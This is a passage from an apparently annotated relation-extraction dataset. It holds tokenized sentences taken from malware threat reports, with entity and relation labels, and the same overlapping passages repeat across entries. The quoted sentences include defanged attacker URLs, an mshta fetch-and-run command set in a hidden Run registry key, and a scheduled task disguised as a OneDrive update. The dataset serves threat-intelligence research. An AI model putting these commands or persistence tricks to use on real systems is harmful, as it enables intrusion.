"main", "function", "hide", "the", "console", "window", "from", "the", "user", "."], ["Afterward", ",", "the", "module", "will", "delete", "old", "``", "sft", "''", "files", "assuming", "they", "were", "already", "exfiltrated", "."], ["After", "a", "pause", "of", "6,500", "milliseconds", ",", "it", "will", "start", "its", "search", "for", "the", "targeted", "files", "."], ["SFT", "file", "creation", "routine", "Using", "the", "working", "directory", "as", "a", "base", "path", ",", "which", "in", "this", "sample", "case", "is", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", ",", "each", "selected", "file", "will", "be", "compressed", "into", "the", "file", "kr.zp", "."], ["The", "kr.zp", "data", "is", "then", "read", "and", "encoded", "using", "the", "same", "unusual", "encoded", "scheme.byte", "=", "byte", "XOR", "(", "byte", ">", ">", "4", ")", "If", "the", "file", "is", "larger", "than", "2048", "*", "53", "bytes", "(", "~", "106kb", ")", "it", "is", "split", "into", "chunks", "and", "saved", "into", "the", "sft", "files", "according", "to", "the", "naming", "convention", "below.gui_app0_", "[", "VolumeSerialNumber", "]", "_", "[", "MonthDay", "]", "_", "[", "Counter", "]", ".sftSince", "this", "module", "does", "not", "have", "a", "loop", ",", "it", "will", "only", "be", "executed", "at", "the", "communications", "module", "startup", ",", "which", "means", "that", "it", "is", "only", "executed", "once", "per", "service", "start", "."], ["Mysterious", "Wintask.xmlOur", "initial", "analysis", "in", "a", "sandbox", "showed", "that", "the", "C2", "contact", "module", "attempts", "to", "execute", "this", "file", ",", "searching", "for", "it", "in", "the", "same", "path", "as", "the", "document", "search", "module", ",", "which", "we", "further", "corroborated", "with", "manual", "analysis", "."], ["All", "files", "in", "the", "toolkit", "are", "dropped", "by", "the", "trojanized", "software", "and", "it", "'s", "clear", "that", "the", "C2", "contact", "module", "expects", "this", "file", "to", "exist", "(", "the", "specific", "name", "changes", "form", "dropper", "to", "dropper", ")", "."], ["After", "first", "being", "documented", ",", "they", "changed", "their", "toolkit", "but", "not", "their", "techniques", "or", "procedures", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "module", "pos": [3, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [23, 23], "name": "sft", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "it", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "targeted files", "pos": [14, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", "pos": [19, 26], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [85, 85], "name": "kr.zp", "pos": [36, 37], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [88, 88], "name": "kr.zp", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [133, 133], "name": "sft files", "pos": [46, 48], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "below.gui_app0_", "pos": [53, 54], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [154, 154], "name": "module", "pos": [67, 68], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [175, 175], "name": "it", "pos": [88, 89], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [194, 194], "name": "C2 contact module", "pos": [10, 13], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [201, 201], "name": "file", "pos": [17, 18], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [205, 205], "name": "it", "pos": [21, 22], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [225, 225], "name": "files", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [233, 233], "name": "trojanized software", "pos": [9, 11], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [241, 241], "name": "C2 contact module", "pos": [17, 20], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [265, 265], "name": "they", "pos": [5, 6], "index": "17_0"}]], "labels": [{"r": "UK", "evidence": [1], "h": 0, "t": 1}, {"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "FR", "evidence": [2, 3, 4], "h": 2, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "t": 7, "h": 8}, {"r": "EX", "evidence": [4], "h": 8, "t": 10}, {"r": "CO", "evidence": [4], "h": 9, "t": 10}, {"r": "EX", "evidence": [5], "h": 11, "t": 12}, {"r": "CO", "evidence": [5], "h": 12, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 11, "t": 16}, {"r": "WR", "evidence": [6], "t": 14, "h": 15}]}, {"title": "05-0", "sents": [["Initial", "finding", ":", "A", "command", "executed", "on", "the", "system", "."], ["The", "31.41.244.231", "IP", "is", "a", "Russian", "IP", "and", "hosts", "several", "other", "URLs", "with", "similar", "naming", "conventions", "."], ["The", "first", "command", "connects", "to", "the", "download", "server", "and", "downloads", "an", "HTA", "application", "whose", "script", "is", "obfuscated", "with", "HTML", "Guardian", ",", "an", "application", "that", "encrypts", "HTML", "code", "."], ["The", "content", "displayed", "when", "the", "HTA", "file", "is", "opened", "in", "a", "browser", "."], ["When", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["Deobfuscated", "HTA", "code", "."], ["The", "autorunnn.exe", "module", "(", "HASH", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ",", "which", "attempts", "to", "create", "a", "hidden", "registry", "entry", "."], ["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."]], "vertexSet": [[{"type": "SO", "sent_id": 1, "global_pos": [11, 11], "name": "31.41.244.231", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [28, 28], "name": "first command", "pos": [1, 3], "index": "1_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [33, 33], "name": "download server", "pos": [6, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [38, 38], "name": "HTA application", "pos": [11, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [60, 60], "name": "HTA", "pos": [5, 6], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [66, 66], "name": "browser", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [72, 72], "name": "HTA", "pos": [4, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [76, 76], "name": "VB script", "pos": [8, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [83, 83], "name": "PowerShell code", "pos": [15, 17], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [86, 86], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [99, 99], "name": "loading process", "pos": [31, 33], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [107, 107], "name": "autorunnn.exe", "pos": [1, 2], "index": "11_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [128, 128], "name": "registry entry", "pos": [22, 24], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [131, 131], "name": "It", "pos": [0, 1], "index": "13_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "RF", "evidence": [2], "h": 1, "t": 2}, {"r": "WR", "evidence": [2], "h": 1, "t": 3}, {"r": "FR", "evidence": [2, 3], "h": 1, "t": 5}, {"r": "FR", "evidence": [3], "t": 4, "h": 5}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "EX", "evidence": [4], "h": 6, "t": 7}, {"r": "FR", "evidence": [4], "h": 6, "t": 8}, {"r": "RF", "evidence": [4], "h": 6, "t": 9}, {"r": "FR", "evidence": [4], "h": 8, "t": 10}, {"r": "RD", "evidence": [4, 5, 6], "h": 10, "t": 12}, {"r": "CO", "evidence": [4, 5, 6], "h": 10, "t": 11}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 10, "t": 13}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}]}, {"title": "05-1", "sents": [["The", "31.41.244.231", "IP", "is", "a", "Russian", "IP", "and", "hosts", "several", "other", "URLs", "with", "similar", "naming", "conventions", "."], ["The", "first", "command", "connects", "to", "the", "download", "server", "and", "downloads", "an", "HTA", "application", "whose", "script", "is", "obfuscated", "with", "HTML", "Guardian", ",", "an", "application", "that", "encrypts", "HTML", "code", "."], ["The", "content", "displayed", "when", "the", "HTA", "file", "is", "opened", "in", "a", "browser", "."], ["When", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["Deobfuscated", "HTA", "code", "."], ["The", "autorunnn.exe", "module", "(", "HASH", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ",", "which", "attempts", "to", "create", "a", "hidden", "registry", "entry", "."], ["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "31.41.244.231", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "first command", "pos": [1, 3], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [23, 23], "name": "download server", "pos": [6, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "HTA application", "pos": [11, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "HTA", "pos": [5, 6], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [56, 56], "name": "browser", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "HTA", "pos": [4, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [66, 66], "name": "VB script", "pos": [8, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [73, 73], "name": "PowerShell code", "pos": [15, 17], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [76, 76], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [89, 89], "name": "loading process", "pos": [31, 33], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "autorunnn.exe", "pos": [1, 2], "index": "11_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [118, 118], "name": "registry entry", "pos": [22, 24], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [121, 121], "name": "It", "pos": [0, 1], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [156, 156], "name": "explorer.exe", "pos": [8, 9], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [161, 161], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [13, 18], "index": "15_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "FR", "evidence": [1, 2], "h": 1, "t": 5}, {"r": "FR", "evidence": [2], "t": 4, "h": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 6, "t": 8}, {"r": "RF", "evidence": [3], "h": 6, "t": 9}, {"r": "FR", "evidence": [3], "h": 8, "t": 10}, {"r": "RD", "evidence": [3, 4, 5], "h": 10, "t": 12}, {"r": "CO", "evidence": [3, 4, 5], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 10, "t": 13}, {"r": "WR", "evidence": [5], "h": 11, "t": 12}, {"r": "FR", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "ST", "evidence": [7], "h": 14, "t": 15}, {"r": "RF", "evidence": [7], "h": 14, "t": 15}]}, {"title": "05-2", "sents": [["The", "first", "command", "connects", "to", "the", "download", "server", "and", "downloads", "an", "HTA", "application", "whose", "script", "is", "obfuscated", "with", "HTML", "Guardian", ",", "an", "application", "that", "encrypts", "HTML", "code", "."], ["The", "content", "displayed", "when", "the", "HTA", "file", "is", "opened", "in", "a", "browser", "."], ["When", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["Deobfuscated", "HTA", "code", "."], ["The", "autorunnn.exe", "module", "(", "HASH", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ",", "which", "attempts", "to", "create", "a", "hidden", "registry", "entry", "."], ["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "first command", "pos": [1, 3], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [6, 6], "name": "download server", "pos": [6, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "HTA application", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "HTA", "pos": [5, 6], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [39, 39], "name": "browser", "pos": [11, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [45, 45], "name": "HTA", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "VB script", "pos": [8, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "PowerShell code", "pos": [15, 17], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [59, 59], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "loading process", "pos": [31, 33], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [80, 80], "name": "autorunnn.exe", "pos": [1, 2], "index": "10_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [101, 101], "name": "registry entry", "pos": [22, 24], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [104, 104], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [139, 139], "name": "explorer.exe", "pos": [8, 9], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [144, 144], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [13, 18], "index": "14_0"}]], "labels": [{"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "FR", "evidence": [1], "t": 3, "h": 4}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "FR", "evidence": [2], "h": 5, "t": 7}, {"r": "RF", "evidence": [2], "h": 5, "t": 8}, {"r": "FR", "evidence": [2], "h": 7, "t": 9}, {"r": "RD", "evidence": [2, 3, 4], "h": 9, "t": 11}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 10}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 9, "t": 12}, {"r": "WR", "evidence": [4], "h": 10, "t": 11}, {"r": "FR", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "ST", "evidence": [6], "h": 13, "t": 14}, {"r": "RF", "evidence": [6], "h": 13, "t": 14}]}, {"title": "05-3", "sents": [["The", "content", "displayed", "when", "the", "HTA", "file", "is", "opened", "in", "a", "browser", "."], ["When", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["Deobfuscated", "HTA", "code", "."], ["The", "autorunnn.exe", "module", "(", "HASH", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ",", "which", "attempts", "to", "create", "a", "hidden", "registry", "entry", "."], ["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."], ["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "HTA", "pos": [5, 6], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [11, 11], "name": "browser", "pos": [11, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [17, 17], "name": "HTA", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "VB script", "pos": [8, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "PowerShell code", "pos": [15, 17], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [31, 31], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "loading process", "pos": [31, 33], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [52, 52], "name": "autorunnn.exe", "pos": [1, 2], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [73, 73], "name": "registry entry", "pos": [22, 24], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [76, 76], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [111, 111], "name": "explorer.exe", "pos": [8, 9], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [116, 116], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [13, 18], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [153, 153], "name": "it", "pos": [11, 12], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [166, 166], "name": "PowerShell loader", "pos": [24, 26], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [171, 171], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 5}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [1, 2, 3], "h": 6, "t": 8}, {"r": "CO", "evidence": [1, 2, 3], "h": 6, "t": 7}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 6, "t": 9}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "FR", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "ST", "evidence": [5], "h": 10, "t": 11}, {"r": "RF", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5, 6, 7], "h": 10, "t": 12}, {"r": "CO", "evidence": [5, 6, 7], "h": 11, "t": 14}, {"r": "WR", "evidence": [7], "h": 12, "t": 13}, {"r": "RF", "evidence": [7], "h": 12, "t": 14}]}, {"title": "05-4", "sents": [["When", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["Deobfuscated", "HTA", "code", "."], ["The", "autorunnn.exe", "module", "(", "HASH", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ",", "which", "attempts", "to", "create", "a", "hidden", "registry", "entry", "."], ["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."], ["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "HTA", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "VB script", "pos": [8, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "PowerShell code", "pos": [15, 17], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [18, 18], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [31, 31], "name": "loading process", "pos": [31, 33], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "autorunnn.exe", "pos": [1, 2], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [60, 60], "name": "registry entry", "pos": [22, 24], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [63, 63], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [98, 98], "name": "explorer.exe", "pos": [8, 9], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [103, 103], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [13, 18], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [140, 140], "name": "it", "pos": [11, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [153, 153], "name": "PowerShell loader", "pos": [24, 26], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [158, 158], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "12_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "FR", "evidence": [0], "h": 2, "t": 4}, {"r": "RD", "evidence": [0, 1, 2], "h": 4, "t": 6}, {"r": "CO", "evidence": [0, 1, 2], "h": 4, "t": 5}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 4, "t": 7}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "FR", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "ST", "evidence": [4], "h": 8, "t": 9}, {"r": "RF", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 10}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 12}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "RF", "evidence": [6], "h": 10, "t": 12}]}, {"title": "05-5", "sents": [["Deobfuscated", "HTA", "code", "."], ["The", "autorunnn.exe", "module", "(", "HASH", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ",", "which", "attempts", "to", "create", "a", "hidden", "registry", "entry", "."], ["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."], ["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [5, 5], "name": "autorunnn.exe", "pos": [1, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [26, 26], "name": "registry entry", "pos": [22, 24], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "It", "pos": [0, 1], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "explorer.exe", "pos": [8, 9], "index": "3_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [69, 69], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [13, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "it", "pos": [11, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [119, 119], "name": "PowerShell loader", "pos": [24, 26], "index": "6_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [124, 124], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [145, 145], "name": "PowerShell", "pos": [3, 4], "index": "8_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 0, "t": 1}, {"r": "FR", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "ST", "evidence": [3], "h": 3, "t": 4}, {"r": "RF", "evidence": [3], "h": 3, "t": 4}, {"r": "CO", "evidence": [3, 4, 5], "h": 3, "t": 5}, {"r": "CO", "evidence": [3, 4, 5], "h": 4, "t": 7}, {"r": "WR", "evidence": [5], "h": 5, "t": 6}, {"r": "RF", "evidence": [5], "h": 5, "t": 7}, {"r": "FR", "evidence": [5, 6, 